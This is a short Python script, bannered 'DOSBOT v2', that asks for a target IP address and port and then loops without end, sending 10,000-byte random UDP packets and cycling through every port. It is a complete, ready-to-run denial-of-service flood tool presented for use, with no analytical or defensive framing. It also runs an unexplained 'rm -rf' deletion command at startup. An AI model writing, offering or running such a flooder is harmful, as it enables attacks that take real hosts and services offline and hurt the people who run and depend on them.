import sys;
import os;
import time;
import socket;
import random;
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(10000);
timeout = time.time();

os.system("rm -rf js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3");
os.system("clear");
print ("""
\033[1;36;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|v2
""");
ip = raw_input("\033[1;36;40mIP: \033[1;33;40m");
port = input("\033[1;36;40mPort: \033[1;33;40m");
os.system("clear");
sent = 0;
while True:
     while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
     sock.sendto(bytes, (ip, port));
     sent = sent + 1;
     port = port + 1;
     # print "\033[1;32;40m%s (%s:%s)" %(sent, ip, port);
     print("\033[1;32;40m",sent,"\033[0m \033[94m<--",ip,port,"-->");
     if port == 65534:
       port = 1;
